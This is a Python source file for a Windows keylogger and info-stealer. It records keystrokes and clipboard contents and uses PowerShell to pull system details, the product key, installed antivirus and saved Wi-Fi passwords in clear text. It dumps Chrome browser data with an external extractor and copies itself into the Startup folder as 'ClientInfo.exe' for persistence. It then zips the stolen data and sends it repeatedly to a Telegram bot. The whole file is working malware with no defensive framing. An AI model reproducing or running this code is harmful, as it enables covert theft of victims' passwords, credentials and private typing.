from time import sleep
from pynput import keyboard
import time, threading, pyperclip, shutil, os, subprocess, requests
from pathlib import Path
from dotenv import load_dotenv

# config variables
keylogger_wait_time = 3
clipboard_wait_time = 3
send_data_sleep_time = 20
startup_file_name = "ClientInfo.exe"
browser_data_path = r'C:\ProgramData\ConfigLogs\sys32\\'
system_info_commands = ['Invoke-RestMethod "https://ipinfo.io/json"', 'Get-NetIPConfiguration',
                        '(Get-CimInstance -ClassName SoftwareLicensingService).OA3OriginalProductKey',
                        'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName, productState, pathToSignedProductExe',
                        'systeminfo | findstr /B /C:"Host Name" /C:"Domain"',
                        '''(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $n=($_ -split ':',2)[1].Trim(); $p=netsh wlan show profile name="$n" key=clear; $k=$p | Select-String 'Key Content'; "$n : " + $(if($k){($k -split ':',2)[1].Trim()}else{'<no password>'}) }''']

# telegram setup variables
load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

# other variables
keylogger_data = []
clipboard_data = []
system_info_data = []
current_data_pos = 0
has_been_pressed = False
system_data_sent = False


def on_press(key):
    global has_been_pressed, keylogger_data
    try:
        if key.vk in range(96, 106):
            # numpad numbers 0-9
            formated = str(int(key.vk) - 96)
        else:
            # normal characters
            formated = key.char
    except AttributeError:
        # special keys
        if key == keyboard.Key.space:
            # space
            formated = " "
        elif key == keyboard.Key.backspace:
            # backspace
            formated = "^BSpace^"
        else:
            # others
            return
    if formated is None or formated == "":
        return
    if len(keylogger_data) > current_data_pos:
        keylogger_data[current_data_pos] += formated
    else:
        keylogger_data.append(formated)

    has_been_pressed = True


def change_current():
    global current_data_pos, has_been_pressed, keylogger_data
    if has_been_pressed == False and len(keylogger_data) > current_data_pos:
        current_data_pos += 1
    has_been_pressed = False
    time.sleep(keylogger_wait_time)
    change_current()


def copy_clipboard():
    return pyperclip.paste()


def clipboard_checker():
    global clipboard_data
    clipboard_value = copy_clipboard()
    if clipboard_value != "":
        if clipboard_data == [] or clipboard_value != clipboard_data[-1]:
            clipboard_data.append(copy_clipboard())
    time.sleep(clipboard_wait_time)
    clipboard_checker()


def create_schedule_task():
    path = Path(__file__)

    startup_path = (Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup")
    final_path = startup_path / startup_file_name

    if not final_path.is_file():
        shutil.copy(path, final_path)


def get_system_info():
    global system_info_data
    for command in system_info_commands:
        proc = subprocess.run(["powershell", "-Command", command],
                              capture_output=True,
                              text=True)
        system_info_data.append(command + '\n' + proc.stdout)


def get_chromium_browsers_data():
    path = Path(__file__).parent / "chromiumExtractor.exe"
    subprocess.run([path] + ["chrome", '-o', browser_data_path])


def send_telegram(text):
    response = requests.post(
        telegram_url,
        json={
            "chat_id": CHAT_ID,
            "text": text
        }
    )

    return response.json()


def send_all_data():
    sleep(send_data_sleep_time)
    global system_data_sent, system_info_data
    data = ""
    # send system info amd browser info only once
    if not system_data_sent:
        for i in system_info_data:
            data += i + "\n"

        # zip whole info catalog
        zip_file = shutil.make_archive(
            browser_data_path,
            "zip",
            browser_data_path
        )
        send_file(zip_file)
        system_data_sent = True

    data += str(keylogger_data) + "\n"
    data += str(clipboard_data) + "\n"

    send_telegram(data)
    sleep(2)
    send_all_data()


def send_file(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

    with open(file_path, "rb") as file:
        response = requests.post(
            url,
            data={"chat_id": CHAT_ID},
            files={"document": file},
            timeout=60
        )

    response.raise_for_status()
    return response.json()


# get Chromium browser data
threading.Thread(target=get_chromium_browsers_data, daemon=True).start()

# get system info
threading.Thread(target=get_system_info, daemon=True).start()

# add exe to autostart
threading.Thread(target=create_schedule_task, daemon=True).start()

# clipboard start
threading.Thread(target=clipboard_checker, daemon=True).start()

# send data via telegram
threading.Thread(target=send_all_data, daemon=True).start()

# keylogger start
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
threading.Thread(target=change_current, daemon=True).start()
